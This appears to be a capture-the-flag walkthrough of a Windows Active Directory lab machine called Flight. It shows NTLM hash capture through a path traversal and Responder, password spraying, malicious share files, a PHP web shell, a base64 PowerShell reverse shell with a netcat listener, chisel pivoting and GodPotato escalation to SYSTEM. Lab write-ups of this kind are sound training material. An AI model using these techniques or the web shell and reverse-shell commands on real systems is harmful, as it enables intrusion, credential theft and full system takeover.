OS: Windows

# Enumeration

```bash
sudo nmap 10.129.228.120 -p- --min-rate 5000 -sS -Pn -n -oN ports
```

```console
Nmap scan report for 10.129.228.120
Host is up (0.17s latency).
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
```

Now we run a detailed scan against each port we found:

```bash
sudo nmap 10.129.228.120 -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389,... -sCV -T5 -vvv -oN Exact_scan
```

```console
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb)
445/tcp   open  microsoft-ds?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb)
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Because of the ports (53, 88, 135, 445) it's obvious we're dealing with an Active Directory. On top of that, I saw port 80 open, a possible foothold through a web application. Let's see what we can find there.

Here I see a few sections but none of them have any real content; everything redirects to index.html#:

![[Captura de pantalla 2026-08-08 a las 11.31.38 p. m..png]]

Something similar happens with the option to buy tickets online:

![[Captura de pantalla 2026-08-08 a las 11.31.32 p. m..png]]

Before testing all the possible web vulns (XXE, SQLi, XSS, command injection, etc.), I noticed the ***GO!*** button only redirected to index.html#:

![[Captura de pantalla 2026-08-08 a las 11.47.05 p. m..png]]

It wasn't sending a POST anywhere, so instead of wasting time on it, I decided to fuzz the web for subdirectories and subdomains. For that, first I need to add the flight.htb domain, which we find at the bottom of the page:

![[Pasted image 20260809133055.png]]

We link it to the machine's IP in `/etc/hosts`:

![[Captura de pantalla 2026-08-09 a las 1.32.02 p. m..png]]

Now we can search for subdomains.

We run ffuf and see many responses with the same size (false positives), so we filter them out:

![[Pasted image 20260809133857.png]]

We can use the `-fs 7069` flag, and this reveals a subdomain:

![[Captura de pantalla 2026-08-09 a las 1.34.12 p. m..png]]

We add it to our `/etc/hosts` to visit the page:

![[Captura de pantalla 2026-08-09 a las 1.32.13 p. m..png]]

Entering the page, I see a possible LFI (Local File Inclusion):

![[Pasted image 20260809135050.png]]

First I had to determine whether the function loading the files is a sensitive one like include(), or a simple file_get_contents(). So I called index.php directly: if it showed me the code, it meant it used file_get_contents behind the scenes and didn't include the code, but showed it in clear text:

![[Pasted image 20260809135709.png]]

This lowers the severity of the vulnerability, turning it into a path traversal, but that doesn't stop us from doing some interesting things, for example making the page (and therefore the user/SPN running it) send us an authentication request so we capture its NTLMv2 hash:

First we set up a listener using responder or smbserver:

```bash
sudo responder -dwv -I tun0
```

Now we make the server send a request to our SMB service:

![[Captura de pantalla 2026-08-09 a las 2.00.57 p. m..png]]

And we do receive the NTLMv2 hash. Time to crack it:

![[Captura de pantalla 2026-08-09 a las 2.00.43 p. m..png]]

We crack it using John The Ripper:

![[Captura de pantalla 2026-08-09 a las 2.04.00 p. m..png]]

This gives us the password `S@Ss!K@*t13` for the user `svc_apache`. With credentials we can try many things. The first thing I do when I get credentials is grab the user list and spray the same password against all users:

Get the user list:

![[Captura de pantalla 2026-08-09 a las 2.24.56 p. m..png]]

Spray the same credential against all users:

![[Captura de pantalla 2026-08-09 a las 2.27.07 p. m..png]]

S.Moon is reusing svc_apache's password. Let's see what shares this user has access to:

![[Captura de pantalla 2026-08-09 a las 4.50.57 p. m..png]]

We have write permissions over the Shared resource. When we enter, we notice there's nothing there, no files or folders.

But that's no obstacle to getting something. When we can drop a file into a Windows machine, there are several files that, simply by being viewed in File Explorer, let us capture the NTLMv2 hashes of whoever views them. The most famous file for this is the .scf, so let's try uploading one:

![[Captura de pantalla 2026-08-09 a las 5.07.13 p. m..png]]

We get an access denied, probably because it doesn't allow uploading certain file extensions. To bypass this we can use [this](https://github.com/Greenwolf/ntlm_theft) repository, which basically generates all the possible malicious files:

![[Captura de pantalla 2026-08-09 a las 5.11.05 p. m..png]]

Now we upload them with a simple one-liner:

![[Captura de pantalla 2026-08-09 a las 5.10.56 p. m..png]]

Since responder was already running from before, I received c.bum's NTLMv2 hash:

![[Captura de pantalla 2026-08-09 a las 5.12.56 p. m..png]]

Now we crack it:

![[Captura de pantalla 2026-08-09 a las 5.14.34 p. m..png]]

We see this user has write permissions on the resource hosting the flight.htb and school.flight.htb websites:

![[Captura de pantalla 2026-08-09 a las 5.21.36 p. m..png]]

We create a PHP web shell and upload it:

![[Captura de pantalla 2026-08-09 a las 5.26.10 p. m..png]]

Now we visit that file on the flight.htb site and pass the cmd parameter with the command to run:

![[Pasted image 20260809172759.png]]

We create the reverse shell:

![[Captura de pantalla 2026-08-09 a las 6.42.35 p. m..png]]

We set up a listener:

```bash
sudo nc -lvnp 4444
```

We send the reverse shell (base64 PowerShell one-liner):

```text
http://flight.htb/evil.php?cmd=powershell -e JABjAGwAaQBlAG4AdAAg...
```

We receive the connection:

![[Captura de pantalla 2026-08-09 a las 6.48.57 p. m..png]]

We don't see any important privilege that lets us escalate, so we have to look for an alternative path. Let's see what services are open internally.

First we list the ports that are open internally:

```bash
netstat -ano | findstr "LISTENING"
```

![[Captura de pantalla 2026-08-10 a las 1.44.20 p. m..png]]

Now we can use my tool letshack to tell us the difference between the ports open externally (which we saw with Nmap) and the ones we found with netstat:

```bash
letshack internal_ports ports.grep netstat.output
```

![[Captura de pantalla 2026-08-10 a las 1.47.59 p. m..png]]

We see WinRM, HTTPS, and a very likely internal page on port 8000 (HTTP alternative). It's probably an IIS server. To confirm it we can go to the root of the machine:

![[Captura de pantalla 2026-08-10 a las 2.32.37 p. m..png]]

We see the inetpub folder. Inside inetpub there are several folders:

![[Captura de pantalla 2026-08-10 a las 2.39.26 p. m..png]]

We list what's inside all these folders recursively:

```powershell
gci -recurse
```

We find that inside `development` there's a structure similar to a website:

![[Captura de pantalla 2026-08-10 a las 2.38.43 p. m..png]]

And if we check the permissions inside this folder, we see that C.Bum (obtained earlier) has permission to edit inside it:

![[Captura de pantalla 2026-08-10 a las 2.41.54 p. m..png]]

We already have the credentials for this user, so we can use RunasCs to move laterally and get a shell as C.Bum. For that we first need to transfer RunasCs.exe.

We host the file:

![[Pasted image 20260810161328.png]]

And we call it using certutil:

![[Captura de pantalla 2026-08-10 a las 4.16.15 p. m..png]]

We use runas to switch users.

We set up a listener:

![[Captura de pantalla 2026-08-10 a las 4.18.35 p. m..png]]

We send the connection:

![[Captura de pantalla 2026-08-10 a las 4.17.27 p. m..png]]

We receive it:

![[Captura de pantalla 2026-08-10 a las 4.19.16 p. m..png]]

Now, as C.Bum, we upload an aspx reverse shell:

![[Captura de pantalla 2026-08-10 a las 4.19.40 p. m..png]]

Now we need to reach that internal website, so we pivot using chisel. First we transfer chisel:

![[Captura de pantalla 2026-08-10 a las 8.21.04 p. m..png]]

We start the server:

![[Captura de pantalla 2026-08-10 a las 9.01.33 p. m..png]]

We send the chisel connection:

![[Captura de pantalla 2026-08-10 a las 9.02.08 p. m..png]]

Since this is a SOCKS connection, we can use FoxyProxy in our browser to conveniently reach the internal website. Let's configure it:

![[Captura de pantalla 2026-08-10 a las 9.09.32 p. m..png]]

We access the WebShell.aspx file we uploaded a moment ago:

![[Captura de pantalla 2026-08-10 a las 9.06.48 p. m..png]]

We set up a listener (again :P):

![[Captura de pantalla 2026-08-10 a las 9.11.20 p. m..png]]

We send a base64 PowerShell reverse shell:

![[Captura de pantalla 2026-08-10 a las 9.16.05 p. m..png]]

As expected, we land as the `iis apppool` user. This user usually has SeImpersonatePrivilege, and on Windows that translates into... NT Authority\System (Administrator)!!!:

![[Captura de pantalla 2026-08-10 a las 9.17.43 p. m..png]]

We'll use GodPotato.

First we transfer it, then we make it execute a reverse shell back to us. We set up a listener on port 5555:

![[Captura de pantalla 2026-08-10 a las 9.25.52 p. m..png]]

We send it:

![[Captura de pantalla 2026-08-10 a las 9.22.42 p. m..png]]

And we receive a shell as `NT AUTHORITY\SYSTEM`:

![[Captura de pantalla 2026-08-10 a las 9.24.16 p. m..png]]

# Machine complete! :D
